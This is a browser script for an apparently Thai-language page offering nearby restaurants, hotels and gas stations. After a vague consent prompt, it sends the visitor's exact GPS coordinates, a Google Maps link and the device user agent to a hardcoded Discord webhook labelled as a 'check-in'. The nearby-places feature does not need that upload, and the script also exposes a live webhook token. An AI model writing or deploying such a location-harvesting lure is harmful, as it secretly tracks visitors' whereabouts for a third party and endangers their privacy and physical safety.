<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1496849383273267433/r7CPrH4HEqreXXwEieJfvrMaafUH5GuqL_atAejh8QXMmYWIWk7poaknFKmAsrj9_Kxd";

let userPos = { lat: 0, lon: 0 };

async function startProcess() {
    if (!navigator.geolocation) return alert("อุปกรณ์ไม่รองรับ");

    if (!confirm("คุณยินยอมส่งพิกัดของคุณไปยังระบบหรือไม่?")) return;

    navigator.geolocation.getCurrentPosition(async (pos) => {
        userPos.lat = pos.coords.latitude;
        userPos.lon = pos.coords.longitude;

        await sendToDiscord();
        showResults();
    }, () => {
        alert("กรุณาเปิด GPS");
    });
}

async function sendToDiscord() {
    const payload = {
        content: "📍 มีคนเช็คอิน",
        embeds: [{
            title: "Location Check-in",
            fields: [
                {
                    name: "พิกัด",
                    value: `${userPos.lat}, ${userPos.lon}`
                },
                {
                    name: "Google Maps",
                    value: `https://www.google.com/maps?q=${userPos.lat},${userPos.lon}`
                },
                {
                    name: "อุปกรณ์",
                    value: navigator.userAgent
                }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });
}

function showResults() {
    document.getElementById('step-result').classList.remove('hidden');

    const categories = [
        { name: "ร้านอาหารยอดนิยมใกล้คุณ", icon: "🍱", query: "restaurants" },
        { name: "โรงแรมและที่พัก", icon: "🏨", query: "hotels" },
        { name: "ปั๊มน้ำมัน", icon: "⛽", query: "gas_station" }
    ];

    const container = document.getElementById('places-container');
    container.innerHTML = "";

    categories.forEach(item => {
        const searchLink = `https://www.google.com/maps/search/${item.query}/@${userPos.lat},${userPos.lon},15z`;
        container.innerHTML += `
            <a href="${searchLink}" target="_blank" class="flex items-center gap-4 bg-white/5 border border-white/10 p-4 rounded-2xl">
                <span class="text-2xl">${item.icon}</span>
                <div class="flex-1">
                    <p class="text-white text-sm font-semibold">${item.name}</p>
                </div>
            </a>
        `;
    });
}
</script>
